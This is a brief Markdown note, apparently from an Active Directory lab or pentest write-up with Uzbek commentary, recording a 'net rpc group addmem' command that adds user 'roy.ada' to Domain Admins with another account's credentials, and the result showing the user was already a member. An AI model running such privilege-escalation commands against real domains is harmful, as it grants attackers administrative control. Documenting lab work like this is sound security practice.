---
title: Domain Admin Membership
tags: [privilege-escalation, domain-admins]
---

# Domain Admin Membership

```bash
net rpc group addmem "Domain Admins" "roy.ada" -U "visual.local"/"hall.noa"%"<LAB_PASSWORD>" -S 192.168.60.76
```

Natija:
```text
Could not add roy.ada to Domain Admins: NT_STATUS_MEMBER_IN_GROUP
```

Demak, command bajarilgan paytda `roy.ada` allaqachon `Domain Admins` a’zosi bo‘lgan.

![[09 - Add Roy Ada to Domain Admins.png]]
![[14 - Domain Admins.png]]
